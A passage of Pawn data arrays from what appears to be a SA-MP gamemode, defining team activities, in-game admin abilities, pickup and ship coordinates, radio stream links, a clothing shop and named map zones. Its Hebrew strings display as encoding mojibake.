		"Team B",green,{100.0,0.0},{31,34,-1,-1,-1},{1000,1000,-1,-1,-1},{-1,-1,-1},4,
	"Єьщъ ьф∙·ю∙ сюшхёщэ фщх°щэ хсЁ∙ўщщъ ыущ ьЄцх° ьўсхЎф ∙ьъ ьЁЎч сў°с фщющ"},
	{"/yvm","Yakuza & Mafia Fight",0,4,sizeof(TeamActivityPositions_5),team_activity,8,4,
		"Yakuza",darkred,{100.0,0.0},{8,-1,-1,-1,-1},{0,-1,-1,-1,-1},{117,118,120},5,
		"Mafia",darkblue,{100.0,0.0},{5,-1,-1,-1,-1},{0,-1,-1,-1,-1},{127,126,125},6,
	"Єьщъ ьЄцх° ьўсхЎф ∙ьъ сў°с юых· юхь фўсхЎф ф∙Ёщщф"},
	{"/cs","Counter Strike",0,4,sizeof(TeamActivityPositions_7),team_activity,8,4,
		"CT",blue,{100.0,100.0},{4,22,29,31,-1},{0,1000,1000,1000,-1},{284,285,163},7,
		"Terrorist",red,{100.0,100.0},{4,23,32,30,-1},{0,1000,1000,1000,-1},{29,121,222},8,
	"Counter Strike Єьщъ ьЇЄхь сщчу Єэ фўсхЎф ∙ьъ Ёту фўсхЎф ф∙Ёщщф, сў°с сётЁхя фю∙чў"}
};
new AdminAbilities[][AdminAbilitiesEnum] =
{
	{"фўЇрф","фўЇщр р· ",5,""},
	{"фё°· фўЇрф","фёщ° фўЇрф ь",5,""},
	{"ючщў· Ё∙ўщэ","ючў р· фЁ∙ўщэ ∙ь ",5,""},
	{"∙щтх° рьщъ","∙щт° р· ",5,""},
	{"∙щтх° рьщъ Єэ °ыс","∙щт° р· ",5,""},
	{"ф°щтф","ф°т р· ",5,""},
	{"ющьхщ чщщэ сьсу","ющьр р· фчщщэ ∙ь ",3,""},
	{"ющьхщ чщщэ хютя","ющьр р· фчщщэ хфютя ∙ь ",3,""},
	{"∙щЁхщ чщщэ","∙щЁф ь X р· фчщщэ ∙ь ",6,"ыюх· фчщщэ"},
	{"∙щЁхщ ютя","∙щЁф ь X р· фютя ∙ь ",6,"ыюх· фютя"},
	{"∙ьщч· ыёє","∙ьч $X ь",15,"ыюх· фыёє"},
	{"фхёЇ· Ё∙ў","фсщр р· Ё∙ў X ь",6,"∙э рх юёЇ° фЁ∙ў"},
	{"фё°· Ё∙ў","фёщ° р· Ё∙ў X ь",6,"∙э рх юёЇ° фЁ∙ў"},
	{"·щў ёщьхя","фсщр ·щў ёщьхя ь",8,""},
	{"фЇщыф ьЎсЄ ься","фЇъ ьсь·щ Ё°рф р· ",5,""},
	{"фЇщыф ьЎсЄ °тщь","фчцщ° р· фЎсЄ ф°тщь ь",5,""},
	{"Ёщўхщ рцф°х· Ў'щшщэ","",3,""},
	{"∙щЁхщ ф∙Єф","∙щЁф ь X р· ф∙Єф сю∙чў ∙ь ",2,"ф∙Єф сю∙чў"},
	{"∙щЁхщ ёўщя","∙щЁф ь X р· фуюх· ∙ь ",6,"юёЇ° фуюх·"},
	{"∙щЁхщ Єхьэ","∙щЁф ь X р· фЄхьэ ∙ь ",5,"юёЇ° фЄхьэ"},
	{"фчц°ф ьёЇрхя","фчцщ° ьёЇрхя р· ",4,""},
	{"фЄью· ф°ыс","фхЎщр юф°ыс р· ",4,""}
};
new Float:SinglePlayerPickupPositions[][3] =
{
	{2832.0,2405.0,18.0},
	{2819.0,1663.0,11.0},
	{2725.0,2727.0,11.0},
	{2649.0,2733.0,11.0},
	{2148.0,2721.0,11.0},
	{1345.0,2367.0,11.0},
	{1625.0,1944.0,11.0},
	{1569.0,2150.0,11.0},
	{2072.0,2370.0,61.0},
	{2225.0,2530.0,17.0},
	{2337.0,1806.0,72.0},
	{2575.0,1562.0,16.0},
	{2243.0,1132.0,11.0},
	{2676.0,836.0,22.0},
	{1761.0,591.0,10.0},
	{2809.0,864.0,21.0},
	{1923.0,1011.0,22.0},
	{1407.0,1098.0,11.0},
	{1319.0,1636.0,10.6},
	{1446.35,1900.03,11.0},
	{1098.0,1681.0,7.0},
	{924.0,2138.0,11.0},
	{1155.0,2341.0,17.0},
	{1646.0,1349.0,11.0},
	{1781.0,2072.0,11.0},
	{2478.0,1182.0,22.0},
	{2854.0,944.0,11.0},
	{2241.0,2425.0,11.0},
	{1418.0,2774.0,15.0},
	{1393.0,2174.0,10.0},
	{1061.0,2074.0,11.0},
	{2057.0,2434.0,166.0},
	{2000.0,1526.0,15.0},
	{1997.0,1658.0,12.0},
	{2510.0,-1723.0,19.0},
	{2538.0,-1630.0,14.0},
	{2551.33,-1740.0,6.49},
	{2428.0,-1214.0,36.0},
	{2766.0,-2182.0,11.0},
	{2142.0,-1804.0,16.0},
	{1764.0,-1930.0,14.0},
	{1214.0,-1816.0,17.0},
	{1740.0,-1231.0,92.0},
	{2266.0,-1028.0,59.0},
	{2463.0,-1061.0,60.0},
	{2047.0,-1406.0,68.0},
	{2213.0,-2283.0,15.0},
	{1463.0,-1013.0,27.0},
	{1308.97,-874.4,40.0},
	{1102.0,-661.0,114.0},
	{899.8012,-792.078,102.0},
	{338.0,-1875.0,4.0},
	{397.0,-1924.0,8.0},
	{886.0,-966.0,37.0},
	{1408.0,-2380.0,14.0},
	{1379.0,-2547.0,14.0},
	{2426.0,-1416.0,24.0},
	{259.0,80.0,1004.0},
	{261.0,71.0,1003.0},
	{1457.0,-792.0,90.0},
	{2371.0,-2543.0,3.0},
	{1124.0,-1335.0,13.0},
	{2197.0,-2475.0,14.0},
	{1528.222,-1357.985,330.0371},
	{1862.0,-1862.0,14.0},
	{1339.0,-1765.0,14.0},
	{2192.243,-1988.751,13.4185},
	{2459.0,-1708.0,13.6},
	{2441.0,-1013.0,54.0},
	{-2678.0,-128.0,4.0},
	{-2212.0,109.0,35.0},
	{-2903.0,784.0,35.0},
	{-2665.0,1452.0,7.0},
	{-2754.0,-400.0,7.0},
	{-2206.0,-23.0,35.0},
	{-1841.106,-74.2171,14.7606},
	{-1579.0,29.45,17.0},
	{-2094.0,-488.0,36.0},
	{-1968.0,-923.0,32.0},
	{-1945.0,-1088.0,31.0},
	{-1700.0,415.0,7.0},
	{-1386.0,509.0,4.0},
	{-1679.0,1410.0,7.0},
	{-2132.52,189.2507,35.5379},
	{-1126.69,-150.82,14.61},
	{-1496.0,591.0,42.0},
	{-2542.262,922.2401,67.1221},
	{-2092.0,1121.0,54.0},
	{-1629.0,1167.0,24.0},
	{-2083.0,298.0,42.0},
	{-2306.0,93.0,35.0},
	{-2796.416,123.686,6.844},
	{-2135.0,197.0,35.0},
	{-2208.0,696.0,50.0},
	{-2206.0,961.0,80.0},
	{-2222.0,-302.0,43.0},
	{-1871.0,351.0,26.0},
	{-2715.0,-314.0,7.0},
	{-2359.0,-82.0,35.0},
	{-1870.0,-1625.0,22.0},
	{-1627.0,-2692.0,49.0},
	{-2038.0,-2562.0,31.0},
	{-1035.0,-2258.0,70.0},
	{2366.0,23.0,28.0},
	{2255.0,-74.0,32.0},
	{1296.0,392.0,20.0},
	{262.0,38.0,2.0},
	{-121.0,-232.0,1.0},
	{-532.0,-106.0,63.0},
	{113.0,1811.0,18.0},
	{36.0,1372.0,9.0},
	{24.0,969.0,20.0},
	{-170.0,1025.0,20.0},
	{-639.0,1181.0,13.0},
	{-585.0,2714.0,72.0},
	{-742.0,2752.0,47.0},
	{-932.02,2649.92,42.0},
	{-1317.0,2509.0,87.0},
	{-1474.0,2577.0,56.0},
	{-2352.0,2456.0,6.0},
	{-2520.0,2293.0,5.0},
	{-1358.0,-2115.0,30.0},
	{119.0,2409.0,17.0},
	{-1809.0,-1662.0,24.0},
	{-2350.0,-1586.0,485.0},
	{-2227.0,-2401.0,31.4},
	{2240.0,-83.0,27.0},
	{294.0,-188.0,2.0},
	{-761.0,-126.0,66.0},
	{-1568.0,2718.0,56.0},
	{-2401.0,2360.0,5.0},
	{-2679.0,1933.0,217.0},
	{637.0,832.0,-43.0},
	{680.0,826.0,-39.0},
	{752.0,260.0,27.0},
	{-246.0,2725.0,63.0},
	{-23.0,2322.0,24.0},
	{1284.894,278.5705,19.5547},
	{2129.4,-2280.71,14.42},
	{-1542.857,698.4825,139.2658},
	{2198.11,-1170.22,33.5},
	{-225.6758,1394.256,172.0143},
	{-773.0379,2423.499,157.0856},
	{935.744,-926.0453,57.7642},
	{842.9783,-17.3791,64.2},
	{255.0493,84.0615,1002.453},
	{217.8,76.4,1005.047},
	{223.8347,120.4458,1010.212},
	{263.2531,109.7859,1004.625},
	{228.3176,114.433,999.0215},
	{247.4536,192.3085,1008.172},
	{242.613,196.3202,1008.172},
	{240.7765,196.1124,1008.172},
	{188.9769,158.218,1003.031},
	{-1753.418,885.3446,295.5166},
	{-2539.918,-598.6152,132.764},
	{-2329.984,-165.3635,35.2389},
	{-2721.241,-318.8085,7.5246},
	{-2677.102,234.9912,4.1048},
	{-2706.692,375.8728,5.0525},
	{-2550.106,657.286,14.7319},
	{-2791.248,771.5468,51.0904},
	{-1770.815,903.2556,25.3894},
	{-1713.006,1368.239,7.2664},
	{-1851.317,1302.291,60.7553},
	{-1635.026,604.4713,40.6377},
	{-1976.483,670.5043,46.6039},
	{-2038.409,1111.406,53.7928},
	{-2048.803,899.5274,53.8866},
	{-2292.47,722.5441,49.4265},
	{-1977.916,113.8457,27.1096},
	{-1528.144,160.0232,3.5142},
	{-1771.261,-597.5884,16.6287},
	{2495.807,-1700.637,1017.837},
	{-2677.726,-192.3469,6.8518},
	{-2752.243,-272.2891,6.5956},
	{-2617.473,-97.0801,4.003},
	{-2777.192,-25.2984,6.8721},
	{-2774.113,87.8845,6.7987},
	{-2770.624,389.0772,4.2818},
	{-2535.631,51.7034,8.6512},
	{-2530.958,-34.1009,25.2855},
	{-1691.649,946.7679,24.8084},
	{-2664.518,636.5673,14.2474},
	{-601.4012,-1068.6,23.6667},
	{-377.2184,-1048.053,58.9125},
	{-45.5928,-1148.529,1.3953},
	{2428.499,-1679.27,13.1633},
	{2820.013,-1426.519,23.805},
	{2790.343,-1427.489,39.6258},
	{2574.065,-1134.201,64.6535},
	{2423.892,-1117.452,41.2464},
	{1296.155,-1081.892,26.1502},
	{1390.611,-800.4332,81.7795},
	{1308.466,2111.289,10.7221},
	{2183.116,2396.827,10.7722},
	{1081.133,1603.697,5.6},
	{777.8668,1948.123,5.3634},
	{1706.352,1242.019,34.2952},
	{2492.051,2398.377,4.5293},
	{2055.355,2435.356,40.3684},
	{1888.27,2877.262,10.1621},
	{1420.945,2519.882,10.6199},
	{1372.996,2605.758,10.8776},
	{2293.686,1982.286,31.4335},
	{2631.263,1722.395,11.0312},
	{2490.497,1522.47,10.576},
	{455.4583,-1485.896,30.9717},
	{244.98,1859.185,14.08},
	{2529.724,-1678.563,19.4225},
	{2254.378,-2261.689,14.3751},
	{2015.744,1004.045,39.1},
	{2002.263,981.3947,10.5},
	{1928.68,-1774.21,13.54},
	{1875.91,-1917.18,15.03},
	{2019.6,-1214.15,21.47},
	{2209.77,-1001.69,63.71},
	{1000.34,-1858.58,12.3},
	{911.11,-1120.31,24.03},
	{929.0,-750.0,105.82},
	{1129.09,-2052.82,69.0},
	{-92.74,-1425.46,12.75},
	{-77.65,-1167.18,2.16},
	{34.0,-2649.0,40.73},
	{-739.0,-1262.0,68.12},
	{-2177.0,-2423.0,30.63},
	{-615.0,-861.0,105.72},
	{-2051.0,948.0,55.4},
	{-2658.0,-187.0,4.18},
	{-2649.0,734.97,27.96},
	{-1791.0,481.0,25.68},
	{-2797.0,1182.0,20.28},
	{-2589.623,-16.165,3.9662},
	{-2865.0,690.0,23.43},
	{-2339.0,-453.0,80.24},
	{-1955.0,-748.0,36.22},
	{-2420.03,987.59,45.3},
	{-326.56,2215.37,43.57},
	{-1319.0,2705.0,50.27},
	{-2474.94,2443.52,16.03},
	{-1670.64,2590.49,81.37},
	{-892.98,1971.66,60.61},
	{1576.86,2837.14,10.83},
	{1492.72,2773.76,10.81},
	{2642.03,1125.74,11.03},
	{2025.24,661.6,10.93},
	{2181.82,1484.97,11.36},
	{2197.02,2476.33,11.0},
	{2212.0,2526.0,10.81},
	{2715.79,1109.47,6.7},
	{2489.25,918.28,11.02},
	{1472.08,1890.09,10.81},
	{2097.0,2154.0,14.0},
	{2435.0,1663.0,16.0},
	{2500.0,925.0,11.0},
	{2106.0,1004.0,11.0},
	{1531.0,925.0,11.0},
	{1433.0,1852.0,10.8},
	{1000.0,1068.0,11.0},
	{1269.0,1352.0,11.0},
	{2294.0,547.0,1.0},
	{2543.0,-1625.0,12.0},
	{2339.0,-1944.0,13.0},
	{2767.0,-1192.0,69.0},
	{2112.0,-1990.0,14.0},
	{2544.0,-1120.0,62.0},
	{1562.0,-1888.0,14.0},
	{1086.0,-1806.0,17.0},
	{253.0,80.0,1004.0},
	{1759.0,-2242.0,1.0},
	{-2650.0,-198.0,4.0},
	{-2285.0,-24.0,35.0},
	{-1863.0,112.0,15.0},
	{-1574.0,1268.0,1.27},
	{-2916.0,992.0,8.0},
	{-2513.0,770.0,35.0},
	{-1394.0,-373.0,6.0},
	{-2303.0,-1606.0,484.0},
	{-2092.0,-2330.0,31.0},
	{-2260.0,2568.0,6.0},
	{-902.0,2689.0,42.0},
	{-317.0,2651.0,67.0},
	{1325.0,190.0,19.0},
	{2487.0,139.0,27.0},
	{761.0,380.0,23.0},
	{-51.0,-232.0,7.0},
	{252.0,2616.0,17.0},
	{212.0,1807.0,22.0},
	{1291.76,-803.4566,1089.93},
	{1715.12,-1673.51,20.22},
	{943.012,-939.8284,57.7345},
	{275.169,1859.699,9.81},
	{1268.34,-804.33,1084.01},
	{263.52,83.14,1001.039},
	{264.2632,117.0737,1008.813},
	{245.0618,195.9429,1008.172},
	{215.8489,126.0831,1003.226},
	{2125.493,-2275.037,20.5202},
	{2230.45,-2286.004,14.3751},
	{2743.0,1316.0,8.0},
	{2168.66,2267.96,15.34},
	{2408.0,1389.0,22.0},
	{2034.0,842.0,10.0},
	{2096.0,1287.0,10.8},
	{1987.0,1543.0,16.0},
	{1854.0,912.0,10.8},
	{2540.38,2527.85,10.39},
	{1548.02,1024.47,10.39},
	{1592.91,2053.83,10.26},
	{1971.29,2330.26,10.41},
	{1700.74,1792.7,10.41},
	{2581.0,-1491.0,24.0},
	{2296.0,-1696.0,14.0},
	{2273.0,-1099.0,38.0},
	{2716.0,-1048.0,66.0},
	{2614.0,-2496.0,33.0},
	{1183.85,-1250.68,14.7},
	{1970.0,-1158.0,21.0},
	{734.0,-1137.0,18.0},
	{2553.76,-2464.31,13.62},
	{1204.06,-1613.89,13.28},
	{611.21,-1459.63,14.01},
	{1116.67,-719.91,100.17},
	{-1903.1,-466.44,25.18},
	{-2657.0,-144.0,4.0},
	{-2454.0,-166.0,35.0},
	{-2009.0,1227.0,32.0},
	{-2120.0,96.39,39.0},
	{-2411.0,-334.0,37.0},
	{-1690.0,450.0,13.0},
	{-1991.26,-1144.13,29.69},
	{-2636.13,-492.83,70.09},
	{-2022.68,345.98,35.17},
	{-2683.2,784.13,49.98},
	{-1820.67,-154.12,9.4},
	{-736.0,66.0,24.0},
	{262.33,-149.12,1.58},
	{1643.0,264.0,20.0},
	{601.98,2150.38,39.41},
	{-1407.0,-2039.0,1.0},
	{-2156.0,-2371.0,31.0},
	{-419.25,1362.36,12.21},
	{629.04,2842.83,25.21},
	{690.49,-209.59,25.6},
	{88.82,-125.1,0.85},
	{215.69,1089.1,16.4},
	{-2305.24,2310.11,4.98},
	{-213.61,2717.44,62.68}
};
new Float:SailingShipRoutes[][6] =
{
	{-1982.57,2052.56,0.0,0.0,0.0,144.84},
	{-2178.63,2103.67,0.0,0.0,0.0,189.24},
	{-2366.64,2020.28,0.0,0.0,0.0,215.22},
	{-2539.06,1892.52,0.0,0.0,0.0,215.22},
	{-2722.79,1787.85,0.0,0.0,0.0,205.62},
	{-2918.51,1729.60,0.0,0.0,0.0,190.50},
	{-3124.70,1758.03,0.0,0.0,0.0,156.36},
	{-3316.51,1850.08,0.0,0.0,0.0,153.36},
	{-3541.12,1977.99,0.0,0.0,0.0,145.74},
	{-3772.54,2140.70,0.0,0.0,0.0,144.96},
	{-4078.78,2272.93,0.0,0.0,0.0,167.52},
	{-4382.22,2222.52,0.0,0.36,0.06,206.70},
	{-4578.11,2013.70,0.0,0.36,0.54,244.80},
	{-4603.54,1718.89,0.0,1.92,-0.36,283.26},
	{-4463.49,1504.50,0.0,0.92,-0.36,316.32},
	{-4228.00,1380.52,0.0,0.92,-0.36,342.54},
	{-3950.14,1346.96,0.0,0.02,-0.06,359.64},
	{-3646.69,1344.57,0.0,0.02,-0.06,359.64},
	{-3350.01,1410.39,0.0,0.02,-0.06,384.48},
	{-2854.63,1651.56,0.0,0.02,-0.06,378.54},
	{-2590.84,1667.61,0.0,0.02,-0.06,356.28},
	{-2345.84,1633.19,0.0,0.02,-0.06,350.28},
	{-2106.14,1639.23,0.0,0.02,-0.06,378.36},
	{-1943.63,1743.98,0.0,0.02,-0.06,411.42},
	{-1891.39,1907.57,0.0,0.02,-0.06,457.14}
};
new Float:SailingShipSpawns[][4] =
{
	{-2056.0645,2087.0229,10.3590,146.1391},
	{-2056.5737,2087.5923,10.3590,149.2724},
	{-2057.0225,2088.4832,10.3590,151.7791},
	{-2045.2981,2091.1367,10.3590,235.4399},
	{-2041.7467,2095.9072,10.3590,246.7200},
	{-1999.5327,2070.7244,10.4996,240.1399},
	{-1995.3013,2055.0969,10.4996,222.5931},
	{-2051.9458,2101.4080,10.3590,53.0781},
	{-2056.9216,2096.5527,10.3590,320.9572}
};
new IScripts[][64] =
{
	"Streamer Plugin (Incognito)",
	"AnimList (OKStyle)",
	"IronMan",
	"ExtFire (Meta)",
	"FlyMode (h02)"
};
new AMusicList[][AMusicEnum] =
{
	//ID, Title, Link
	{"Hit 104","http://tuner.hit104.com:80"},
	{"I Love Radio","http://www.iloveradio.de/listen.m3u"},
	{"I Love Radio 2","http://www.iloveradio.de/listen2.m3u"},
	{"Sky FM Top Hits","http://listen.sky.fm/public3/tophits.pls"},
	{"100FM °ущхё","http://213.8.143.168/100fmAudio"},
	{"тьщ Ўфь","http://50.22.219.97:14959/"}
};
new ClothesCategories[][32] = {"сЁуЁх·","ыхсЄщэ #1","ыхсЄщэ #2","ыхсЄщэ #3","ыхсЄщэ #4","схў°щэ","ыхсЄщэ ющхчущэ","ыхсЄщ ыЁхЇщх·","юёых·","∙ЄхЁщэ","ю∙ўЇщщэ","ю∙ўЇщщэ ющхчух·","рхцЁщх·","ЎЄщЇщэ"};
new Clothes[][ClothesEnum] =
{
	// object model, category, bone, name, cost
	{18891,0,2,"сЁуЁф ычхь ыфф",5},
	{18892,0,2,"сЁуЁф рухюф",5},
	{18893,0,2,"сЁуЁф рухэ ься",20},
	{18894,0,2,"сЁуЁф Ўфхсф",5},
	{18895,0,2,"сЁуЁф тхьтхь·",20},
	{18896,0,2,"сЁуЁф ∙чх°ф",5},
	{18897,0,2,"сЁуЁф ычхьф",5},
	{18898,0,2,"сЁуЁф щ°хўф",5},
	{18899,0,2,"сЁуЁф ётхьф",5},
	{18900,0,2,"сЁуЁф ЎсЄхЁщ·",20},
	{18908,0,2,"сЁуЁф ў°ч",20},
	{18910,0,2,"сЁуЁф р∙",20},
	{18921,1,2,"ыхсЄ #1 ∙чх°",15},
	{18922,1,2,"ыхсЄ #1 рухэ",15},
	{18923,1,2,"ыхсЄ #1 ычхь",15},
	{18924,1,2,"ыхсЄ #1 Ўср",25},
	{18940,2,2,"ыхсЄ #2 ∙чх°",15},
	{18942,2,2,"ыхсЄ #2 ычхь",15},
	{18943,2,2,"ыхсЄ #2 щ°хў",15},
	{18939,2,2,"ыхсЄ #2 с°ўщэ",25},
	{18955,3,2,"ыхсЄ #3 ы·хэ ься",25},
	{18956,3,2,"ыхсЄ #3 с°ўщэ",25},
	{18957,3,2,"ыхсЄ #3 тьщэ",25},
	{18958,3,2,"ыхсЄ #3 Ўфхс ∙чх°",25},
	{18959,3,2,"ыхсЄ #3 щ°хў",15},
	{18971,4,2,"ыхсЄ #4 ычхь рухэ",25},
	{18972,4,2,"ыхсЄ #4 ы·хэ ∙чх°",25},
	{18973,4,2,"ыхсЄ #4 тххЁщ Ўфхс",25},
	{18974,4,2,"ыхсЄ #4 тххЁщ чхэ",25},
	{19095,5,2,"ыхсЄ схў° #1",30},
	{18962,5,2,"ыхсЄ схў° #2",30},
	{19096,5,2,"ыхсЄ схў° ∙чх° юьр",30},
	{19097,5,2,"ыхсЄ схў° рухэ",30},
	{19096,5,2,"ыхсЄ схў° чхэ",30},
	{18926,6,2,"ыхсЄ тххЁщ щ°хў",25},
	{18927,6,2,"ыхсЄ тьщэ",25},
	{18928,6,2,"ыхсЄ ЎсЄхЁщ",25},
	{18929,6,2,"ыхсЄ юЄтьщэ",25},
	{18930,6,2,"ыхсЄ р∙",25},
	{18931,6,2,"ыхсЄ с°ўщэ",25},
	{18932,6,2,"ыхсЄ ы·хэ ься",25},
	{18933,6,2,"ыхсЄ Ёўхух· сЎсЄщэ",25},
	{18934,6,2,"ыхсЄ х°ху",25},
	{18935,6,2,"ыхсЄ тсщЁф",25},
	{19093,6,2,"рЇх° рщўё",25},
	{19160,6,2,"Ўфхс рщўё",25},
	{19161,6,2,"ыхсЄ ∙хш°щэ",50},
	{19162,6,2,"ыхсЄ ∙хш°щэ #2",50},
	{19064,6,2,"ыхсЄ ёЁшф ўьрхё",60},
	{19067,7,2,"ыхсЄ тЁтёш°",40},
	{19068,7,2,"ыхсЄ тххЁщ ∙чх° ься",40},
	{19069,7,2,"ыхсЄ тхьтхь·",40},
	{19094,8,2,"фюсх°т°",50},
	{19137,8,2,"·°Ётхь",80},
	{19036,8,2,"фхўщ ься",45},
	{19037,8,2,"фхўщ рухэ",45},
	{19038,8,2,"фхўщ щ°хў",45},
	{18974,8,2,"цх°х",80},
	{19163,8,2,"тщюЇ",40},
	{19350,8,2,"∙Їэ #1",30},
	{19351,8,2,"∙Їэ #2",30},
	{19472,8,2,"юёы· тц",30},
	{19039,9,5,"∙Єхя Ўфхс ься",45},
	{19040,9,5,"∙Єхя рЇх° ∙чх°",45},
	{19041,9,5,"∙Єхя чхэ ∙чх°",45},
	{19042,9,5,"∙Єхя Ўфхс ∙чх°",45},
	{19043,9,5,"∙Єхя рЇх° ься",45},
	{19044,9,5,"∙Єхя ётхь ∙чх°",45},
	{19045,9,5,"∙Єхя х°ху ∙чх°",45},
	{19046,9,5,"∙Єхя щ°хў ∙чх°",45},
	{19047,9,5,"∙Єхя сх°ух ∙чх°",45},
	{19048,9,5,"∙Єхя с°ўщэ ∙чх°",45},
	{19049,9,5,"∙Єхя ЎсЄхЁщ ∙чх°",45},
	{19050,9,5,"∙Єхя тххЁщ-ычхь ∙чх°",45},
	{19051,9,5,"∙Єхя ы·хэ ∙чх°",45},
	{19052,9,5,"∙Єхя тххЁщ-х°ху ∙чх°",45},
	{19053,9,5,"∙Єхя тххЁщ-чхэ ∙чх°",45},
	{19030,10,2,"ю∙ўЇщщэ #1",25},
	{19031,10,2,"ю∙ўЇщщэ #2",25},
	{19006,10,2,"ю∙ўЇщщэ Єу∙х· рухюх·",35},
	{19007,10,2,"ю∙ўЇщщэ Єу∙х· ы·хюх·",35},
	{19008,10,2,"ю∙ўЇщщэ Єу∙х· щ°хўх·",35},
	{19009,10,2,"ю∙ўЇщщэ Єу∙х· ычхьх·",35},
	{19010,10,2,"ю∙ўЇщщэ Єу∙х· х°хух·",35},
	{19017,10,2,"ю∙ўЇщщэ Ўфхсх·",35},
	{19018,10,2,"ю∙ўЇщщэ ы·хюх·",35},
	{19019,10,2,"ю∙ўЇщщэ рухюх·",35},
	{19020,10,2,"ю∙ўЇщщэ ычхьх·",35},
	{19021,10,2,"ю∙ўЇщщэ щ°хўх·",35},
	{19011,11,2,"ю∙ўЇщщ фщЇЁхцф",200},
	{19013,11,2,"ю∙ўЇщщ юЄть",80},
	{19016,11,2,"ю∙ўЇщщ °Ёштя",100},
	{19033,11,2,"ю∙ўЇщщ ёхыЁх· ч∙рщ·",80},
	{19035,11,2,"ю∙ўЇщщ с°ў",80},
	{19138,11,2,"ю∙ўЇщщ ю∙ш°ф ∙чх°х·",50},
	{19139,11,2,"ю∙ўЇщщ ю∙ш°ф рухюх·",50},
	{19140,11,2,"ю∙ўЇщщ ю∙ш°ф ычхьх·",50},
	{19421,12,2,"рхцЁщх· ьсЁх·",40},
	{19422,12,2,"рхцЁщх· ∙чх°х·",40},
	{19423,12,2,"рхцЁщх· рухюх·",40},
	{19424,12,2,"рхцЁщх· ычхьх·",40},
	{19469,13,2,"ЎЄщє ься",35}
};
new Float:Zones[][ZoneData] =
{
	{"'The Big Ear'",-410.00,1403.30,-3.00,-137.90,1681.20,200.00},
	{"Aldea Malvada",-1372.10,2498.50,0.00,-1277.50,2615.30,200.00},
	{"Angel Pine",-2324.90,-2584.20,-6.10,-1964.20,-2212.10,200.00},
	{"Arco del Oeste",-901.10,2221.80,0.00,-592.00,2571.90,200.00},
	{"Avispa Country Club",-2646.40,-355.40,0.00,-2270.00,-222.50,200.00},
	{"Avispa Country Club",-2831.80,-430.20,-6.10,-2646.40,-222.50,200.00},
	{"Avispa Country Club",-2361.50,-417.10,0.00,-2270.00,-355.40,200.00},
	{"Avispa Country Club",-2667.80,-302.10,-28.80,-2646.40,-262.30,71.10},
	{"Avispa Country Club",-2470.00,-355.40,0.00,-2270.00,-318.40,46.10},
	{"Avispa Country Club",-2550.00,-355.40,0.00,-2470.00,-318.40,39.70},
	{"Back o Beyond",-1166.90,-2641.10,0.00,-321.70,-1856.00,200.00},
	{"Battery Point",-2741.00,1268.40,-4.50,-2533.00,1490.40,200.00},
	{"Bayside",-2741.00,2175.10,0.00,-2353.10,2722.70,200.00},
	{"Bayside Marina",-2353.10,2275.70,0.00,-2153.10,2475.70,200.00},
	{"Beacon Hill",-399.60,-1075.50,-1.40,-319.00,-977.50,198.50},
	{"Blackfield",964.30,1203.20,-89.00,1197.30,1403.20,110.90},
	{"Blackfield",964.30,1403.20,-89.00,1197.30,1726.20,110.90},
	{"Blackfield Chapel",1375.60,596.30,-89.00,1558.00,823.20,110.90},
	{"Blackfield Chapel",1325.60,596.30,-89.00,1375.60,795.00,110.90},
	{"Blackfield Intersection",1197.30,1044.60,-89.00,1277.00,1163.30,110.90},
	{"Blackfield Intersection",1166.50,795.00,-89.00,1375.60,1044.60,110.90},
	{"Blackfield Intersection",1277.00,1044.60,-89.00,1315.30,1087.60,110.90},
	{"Blackfield Intersection",1375.60,823.20,-89.00,1457.30,919.40,110.90},
	{"Blueberry",104.50,-220.10,2.30,349.60,152.20,200.00},
	{"Blueberry",19.60,-404.10,3.80,349.60,-220.10,200.00},
	{"Blueberry Acres",-319.60,-220.10,0.00,104.50,293.30,200.00},
	{"Caligula's Palace",2087.30,1543.20,-89.00,2437.30,1703.20,110.90},
	{"Caligula's Palace",2137.40,1703.20,-89.00,2437.30,1783.20,110.90},
	{"Calton Heights",-2274.10,744.10,-6.10,-1982.30,1358.90,200.00},
	{"Chinatown",-2274.10,578.30,-7.60,-2078.60,744.10,200.00},
	{"City Hall",-2867.80,277.40,-9.10,-2593.40,458.40,200.00},
	{"Come-A-Lot",2087.30,943.20,-89.00,2623.10,1203.20,110.90},
	{"Commerce",1323.90,-1842.20,-89.00,1701.90,-1722.20,110.90},
	{"Commerce",1323.90,-1722.20,-89.00,1440.90,-1577.50,110.90},
	{"Commerce",1370.80,-1577.50,-89.00,1463.90,-1384.90,110.90},
	{"Commerce",1463.90,-1577.50,-89.00,1667.90,-1430.80,110.90},
	{"Commerce",1583.50,-1722.20,-89.00,1758.90,-1577.50,110.90},
	{"Commerce",1667.90,-1577.50,-89.00,1812.60,-1430.80,110.90},
	{"Conference Center",1046.10,-1804.20,-89.00,1323.90,-1722.20,110.90},
	{"Conference Center",1073.20,-1842.20,-89.00,1323.90,-1804.20,110.90},
	{"Cranberry Station",-2007.80,56.30,0.00,-1922.00,224.70,100.00},
	{"Creek",2749.90,1937.20,-89.00,2921.60,2669.70,110.90},
	{"Dillimore",580.70,-674.80,-9.50,861.00,-404.70,200.00},
	{"Doherty",-2270.00,-324.10,-0.00,-1794.90,-222.50,200.00},
	{"Doherty",-2173.00,-222.50,-0.00,-1794.90,265.20,200.00},
	{"Wangs",-1982.30,744.10,-6.10,-1871.70,1274.20,200.00},
	{"Wangs",-1871.70,1176.40,-4.50,-1620.30,1274.20,200.00},
	{"Wangs",-1700.00,744.20,-6.10,-1580.00,1176.50,200.00},
	{"Wangs",-1580.00,744.20,-6.10,-1499.80,1025.90,200.00},
	{"Wangs",-2078.60,578.30,-7.60,-1499.80,744.20,200.00},
	{"Wangs",-1993.20,265.20,-9.10,-1794.90,578.30,200.00},
	{"Downtown Los Santos",1463.90,-1430.80,-89.00,1724.70,-1290.80,110.90},
	{"Downtown Los Santos",1724.70,-1430.80,-89.00,1812.60,-1250.90,110.90},
	{"Downtown Los Santos",1463.90,-1290.80,-89.00,1724.70,-1150.80,110.90},
	{"Downtown Los Santos",1370.80,-1384.90,-89.00,1463.90,-1170.80,110.90},
	{"Downtown Los Santos",1724.70,-1250.90,-89.00,1812.60,-1150.80,110.90},
	{"Downtown Los Santos",1370.80,-1170.80,-89.00,1463.90,-1130.80,110.90},
	{"Downtown Los Santos",1378.30,-1130.80,-89.00,1463.90,-1026.30,110.90},
	{"Downtown Los Santos",1391.00,-1026.30,-89.00,1463.90,-926.90,110.90},
	{"Downtown Los Santos",1507.50,-1385.20,110.90,1582.50,-1325.30,335.90},
	{"East Beach",2632.80,-1852.80,-89.00,2959.30,-1668.10,110.90},
	{"East Beach",2632.80,-1668.10,-89.00,2747.70,-1393.40,110.90},
